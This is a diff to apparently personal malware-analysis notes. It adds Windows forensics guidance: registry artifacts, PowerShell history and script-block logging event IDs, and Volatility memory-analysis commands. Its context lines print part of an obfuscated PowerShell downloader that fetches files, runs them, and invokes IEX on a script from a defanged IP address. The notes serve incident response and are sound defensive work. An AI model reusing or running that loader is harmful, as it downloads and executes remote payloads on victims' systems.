@@ -474,3 +474,51 @@ VNQ4kjqu6toA7flH/FWPTWeAsZeaySL08pXNnoI4xQJ1BHw0NvffzCKhp1vXVNw==
  foreach($IPpm4NiW in $vuRDOAzC){try{$o4f9Ud.DowNloaDfIlE($IPpm4NiW, $UpwpWW);If ((.('Get-I'+'te'+'m')
  $UpwpWW).lENGth -ge 2977) {[Diagnostics.Process]::STaRt($UpwpWW);break;}}catch{}};
  IEX($o4f9Ud.DownLOaDStrIng('http://109[.]196.164.79/3.php'));
+
+============================================================================================================
+
+				Windows Forensics Artifacts extract and basic analysis
+				
+* Use FTK imager to extract the protected file from local system
+* Use Registry viewer to view the artifacts of office document execution from path 
+		NTUSER.dat\Software\Microsoft\Office\14.0\Word\Resillency\DocumentsRecovery
+		Look for powershell execution in event ID 
+		
+PowerShell command history
+Where to find it
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
+What you can find
+By default, in Windows 10, the last 4096 typed commands. The history is stored separately for PowerShell and ISE.
+Further reading
+This capability was introduced in the PowerShell v5, in Windows 10. It is based on the third party module PSReadLine, which is not included in the separately installed PowerShell 5 for previous versions of Windows.
+References
+http://woshub.com/powershell-commands-history/
+https://blog.illusivenetworks.com/tech/windows-console-command-history-live-response-investigation
+Script block logging
+Where to find it
+Event log: Microsoft-Windows-PowerShell/Operational. 
+What you can find 
+Event ID: 4104. Script blocks. If a script block creates another script block (for example, a script that calls the Invoke-Expression cmdlet on a string), that resulting script block is logged as well. Due to the nature of script block logging, it also records de-obfuscated code as it is executed. 
+Event ID: 4100. Error messages when the script did not run properly.
+Event ID: 4103. Module logging.
+Event ID: 4105 and 4106.  Script block execution start and stop events. They are quite noisy and not recommended in most of the environments.
+
+Memory Analysis 
+
+Extract the memory dump using FTK memory extraction 
+
+  620  vol.py --info
+  622  vol.py imageinfo -f memdump.mem 
+  623  vol.py --profile=Win7SP1x64 -f memdump.mem ps
+  624  vol.py --profile=Win7SP1x64 -f memdump.mem pslist
+  625  vol.py --profile=Win7SP1x64 -f memdump.mem pstree
+  626  vol.py --profile=Win7SP1x64 -f memdump.mem psxview
+  627  vol.py --profile=Win7SP1x64 -f memdump.mem connscan
+  628  vol.py --profile=Win7SP1x64 -f memdump.mem netconn
+  629  vol.py --profile=Win7SP1x64 -f memdump.mem netscan
+  630  vol.py --profile=Win7SP1x64 -f memdump.mem cmdline
+  631  vol.py --profile=Win7SP1x64 -f memdump.mem pstree
+  632  vol.py --profile=Win7SP1x64 -f memdump.mem procdump -p 1652 --dump-dir .
+  635  vol.py --profile=Win7SP1x64 -f memdump.mem memdump -p 1652 --dump-dir .
+  
+  
